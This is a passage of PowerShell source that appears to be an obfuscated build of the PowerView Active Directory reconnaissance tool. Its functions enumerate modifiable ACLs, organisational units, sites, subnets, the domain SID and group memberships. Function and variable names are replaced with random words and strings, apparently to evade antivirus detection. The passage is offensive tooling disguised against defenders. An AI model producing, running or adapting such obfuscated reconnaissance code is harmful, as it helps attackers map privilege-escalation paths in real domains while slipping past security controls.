        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $FbZFnakt99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $xiLKRAfK99 = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $xiLKRAfK99['ResolveGUIDs'] = $gwRlAoyy99 }
        if ($PSBoundParameters['RightsFilter']) { $xiLKRAfK99['RightsFilter'] = $FbZFnakt99 }
        if ($PSBoundParameters['LDAPFilter']) { $xiLKRAfK99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['SearchBase']) { $xiLKRAfK99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $xiLKRAfK99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $xiLKRAfK99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $xiLKRAfK99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xiLKRAfK99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $xiLKRAfK99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $xiLKRAfK99['Credential'] = $fjBNCklg99 }
        $WaxTRsWi99 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $WaxTRsWi99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $WaxTRsWi99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $WaxTRsWi99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WaxTRsWi99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $WaxTRsWi99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $WaxTRsWi99['Credential'] = $fjBNCklg99 }
        $EufoKtXA99 = @{}
        if ($PSBoundParameters['Server']) { $EufoKtXA99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['Credential']) { $EufoKtXA99['Credential'] = $fjBNCklg99 }
        $YgLOZVqh99 = @{}
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $xiLKRAfK99['Domain'] = $jnYnRnFJ99
            $EufoKtXA99['Domain'] = $jnYnRnFJ99
        }
        anthropomorphic @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($YgLOZVqh99[$_.SecurityIdentifier.Value]) {
                        $ihsolKme99, $MwNBhsvF99, $RMsGnJTj99, $mDoqMxAr99 = $YgLOZVqh99[$_.SecurityIdentifier.Value]
                        $vqyUKJHP99 = New-Object PSObject
                        $vqyUKJHP99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $vqyUKJHP99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $vqyUKJHP99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $vqyUKJHP99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $vqyUKJHP99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $vqyUKJHP99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $vqyUKJHP99 | Add-Member NoteProperty 'AceType' $_.AceType
                        $vqyUKJHP99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $vqyUKJHP99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $vqyUKJHP99 | Add-Member NoteProperty 'IdentityReferenceName' $ihsolKme99
                        $vqyUKJHP99 | Add-Member NoteProperty 'IdentityReferenceDomain' $MwNBhsvF99
                        $vqyUKJHP99 | Add-Member NoteProperty 'IdentityReferenceDN' $RMsGnJTj99
                        $vqyUKJHP99 | Add-Member NoteProperty 'IdentityReferenceClass' $mDoqMxAr99
                        $vqyUKJHP99
                    }
                    else {
                        $RMsGnJTj99 = offings -feaYcbZI99 $_.SecurityIdentifier.Value -EsfqZxkA99 DN @ADNameArguments
                        if ($RMsGnJTj99) {
                            $MwNBhsvF99 = $RMsGnJTj99.SubString($RMsGnJTj99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            $WaxTRsWi99['Domain'] = $MwNBhsvF99
                            $WaxTRsWi99['Identity'] = $RMsGnJTj99
                            $Object = trashier @ObjectSearcherArguments
                            if ($Object) {
                                $ihsolKme99 = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $mDoqMxAr99 = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $mDoqMxAr99 = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $mDoqMxAr99 = 'user'
                                }
                                else {
                                    $mDoqMxAr99 = $Null
                                }
                                $YgLOZVqh99[$_.SecurityIdentifier.Value] = $ihsolKme99, $MwNBhsvF99, $RMsGnJTj99, $mDoqMxAr99
                                $vqyUKJHP99 = New-Object PSObject
                                $vqyUKJHP99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $vqyUKJHP99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $vqyUKJHP99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $vqyUKJHP99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $vqyUKJHP99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $vqyUKJHP99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $vqyUKJHP99 | Add-Member NoteProperty 'AceType' $_.AceType
                                $vqyUKJHP99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $vqyUKJHP99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $vqyUKJHP99 | Add-Member NoteProperty 'IdentityReferenceName' $ihsolKme99
                                $vqyUKJHP99 | Add-Member NoteProperty 'IdentityReferenceDomain' $MwNBhsvF99
                                $vqyUKJHP99 | Add-Member NoteProperty 'IdentityReferenceDN' $RMsGnJTj99
                                $vqyUKJHP99 | Add-Member NoteProperty 'IdentityReferenceClass' $mDoqMxAr99
                                $vqyUKJHP99
                            }
                        }
                        else {
                            Write-Warning "[pinions] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with offings"
                        }
                    }
                }
            }
        }
    }
}
function infuriating {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $IBwChXGj99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $djIXJZbu99 = maroons @SearcherArguments
    }
    PROCESS {
        if ($djIXJZbu99) {
            $igkjuUBu99 = ''
            $pIJjStMG99 = ''
            $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($vNrdYYXO99 -match '^OU=.*') {
                    $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[infuriating] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
                        $XVFWmInN99['Domain'] = $CtdjjEVe99
                        $djIXJZbu99 = maroons @SearcherArguments
                        if (-not $djIXJZbu99) {
                            Write-Warning "[infuriating] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                        }
                    }
                }
                else {
                    try {
                        $VAqEOfOY99 = (-Join (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                    }
                    catch {
                        $igkjuUBu99 += "(name=$vNrdYYXO99)"
                    }
                }
            }
            if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                $pIJjStMG99 += "(|$igkjuUBu99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[infuriating] Searching for OUs with $IBwChXGj99 set in the gpLink property"
                $pIJjStMG99 += "(gplink=*$IBwChXGj99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[infuriating] Using additional LDAP filter: $SeHRgLsL99"
                $pIJjStMG99 += "$SeHRgLsL99"
            }
            $djIXJZbu99.filter = "(&(objectCategory=organizationalUnit)$pIJjStMG99)"
            Write-Verbose "[infuriating] infuriating filter string: $($djIXJZbu99.filter)"
            if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $djIXJZbu99.FindOne() }
            else { $CmGXBhUd99 = $djIXJZbu99.FindAll() }
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $OU = $_
                }
                else {
                    $OU = foregather -ycQOyvWh99 $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[infuriating] Error disposing of the Results object: $_"
                }
            }
            $djIXJZbu99.dispose()
        }
    }
}
function bifurcating {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $IBwChXGj99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $XVFWmInN99 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $SlYrAieX99 = maroons @SearcherArguments
    }
    PROCESS {
        if ($SlYrAieX99) {
            $igkjuUBu99 = ''
            $pIJjStMG99 = ''
            $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($vNrdYYXO99 -match '^CN=.*') {
                    $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[bifurcating] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
                        $XVFWmInN99['Domain'] = $CtdjjEVe99
                        $SlYrAieX99 = maroons @SearcherArguments
                        if (-not $SlYrAieX99) {
                            Write-Warning "[bifurcating] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                        }
                    }
                }
                else {
                    try {
                        $VAqEOfOY99 = (-Join (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                    }
                    catch {
                        $igkjuUBu99 += "(name=$vNrdYYXO99)"
                    }
                }
            }
            if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                $pIJjStMG99 += "(|$igkjuUBu99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[bifurcating] Searching for sites with $IBwChXGj99 set in the gpLink property"
                $pIJjStMG99 += "(gplink=*$IBwChXGj99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[bifurcating] Using additional LDAP filter: $SeHRgLsL99"
                $pIJjStMG99 += "$SeHRgLsL99"
            }
            $SlYrAieX99.filter = "(&(objectCategory=site)$pIJjStMG99)"
            Write-Verbose "[bifurcating] bifurcating filter string: $($SlYrAieX99.filter)"
            if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $SlYrAieX99.FindAll() }
            else { $CmGXBhUd99 = $SlYrAieX99.FindAll() }
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Site = $_
                }
                else {
                    $Site = foregather -ycQOyvWh99 $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[bifurcating] Error disposing of the Results object"
                }
            }
            $SlYrAieX99.dispose()
        }
    }
}
function crabbiest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $iSntscLt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $XVFWmInN99 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $kCJvxGqi99 = maroons @SearcherArguments
    }
    PROCESS {
        if ($kCJvxGqi99) {
            $igkjuUBu99 = ''
            $pIJjStMG99 = ''
            $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($vNrdYYXO99 -match '^CN=.*') {
                    $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[crabbiest] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
                        $XVFWmInN99['Domain'] = $CtdjjEVe99
                        $kCJvxGqi99 = maroons @SearcherArguments
                        if (-not $kCJvxGqi99) {
                            Write-Warning "[crabbiest] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                        }
                    }
                }
                else {
                    try {
                        $VAqEOfOY99 = (-Join (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                    }
                    catch {
                        $igkjuUBu99 += "(name=$vNrdYYXO99)"
                    }
                }
            }
            if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                $pIJjStMG99 += "(|$igkjuUBu99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[crabbiest] Using additional LDAP filter: $SeHRgLsL99"
                $pIJjStMG99 += "$SeHRgLsL99"
            }
            $kCJvxGqi99.filter = "(&(objectCategory=subnet)$pIJjStMG99)"
            Write-Verbose "[crabbiest] crabbiest filter string: $($kCJvxGqi99.filter)"
            if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $kCJvxGqi99.FindOne() }
            else { $CmGXBhUd99 = $kCJvxGqi99.FindAll() }
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $LIYXnLSl99 = $_
                }
                else {
                    $LIYXnLSl99 = foregather -ycQOyvWh99 $_.Properties
                }
                $LIYXnLSl99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
                if ($PSBoundParameters['SiteName']) {
                    if ($LIYXnLSl99.properties -and ($LIYXnLSl99.properties.siteobject -like "*$iSntscLt99*")) {
                        $LIYXnLSl99
                    }
                    elseif ($LIYXnLSl99.siteobject -like "*$iSntscLt99*") {
                        $LIYXnLSl99
                    }
                }
                else {
                    $LIYXnLSl99
                }
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[crabbiest] Error disposing of the Results object: $_"
                }
            }
            $kCJvxGqi99.dispose()
        }
    }
}
function conflicts {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    $XVFWmInN99 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
    if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
    if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
    $DCSID = cowing @SearcherArguments -cIwTZAKh99 | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[conflicts] Error extracting domain SID for '$jnYnRnFJ99'"
    }
}
function con {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $opuAHvjq99,
        [Switch]
        $svHNHCqS99,
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $EWVyQbhs99,
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $fcEOKWrF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $edvQoMcf99 = maroons @SearcherArguments
    }
    PROCESS {
        if ($edvQoMcf99) {
            if ($PSBoundParameters['MemberIdentity']) {
                if ($XVFWmInN99['Properties']) {
                    $pOrzlwhD99 = $XVFWmInN99['Properties']
                }
                $XVFWmInN99['Identity'] = $opuAHvjq99
                $XVFWmInN99['Raw'] = $True
                trashier @SearcherArguments | ForEach-Object {
                    $xAFCcoGy99 = $_.GetDirectoryEntry()
                    $xAFCcoGy99.RefreshCache('tokenGroups')
                    $xAFCcoGy99.TokenGroups | ForEach-Object {
                        $PzXOJiqw99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if ($PzXOJiqw99 -notmatch '^S-1-5-32-.*') {
                            $XVFWmInN99['Identity'] = $PzXOJiqw99
                            $XVFWmInN99['Raw'] = $False
                            if ($pOrzlwhD99) { $XVFWmInN99['Properties'] = $pOrzlwhD99 }
                            $Group = trashier @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $igkjuUBu99 = ''
                $pIJjStMG99 = ''
                $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                    $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($vNrdYYXO99 -match '^S-1-') {
                        $igkjuUBu99 += "(objectsid=$vNrdYYXO99)"
                    }
                    elseif ($vNrdYYXO99 -match '^CN=') {
                        $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[con] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
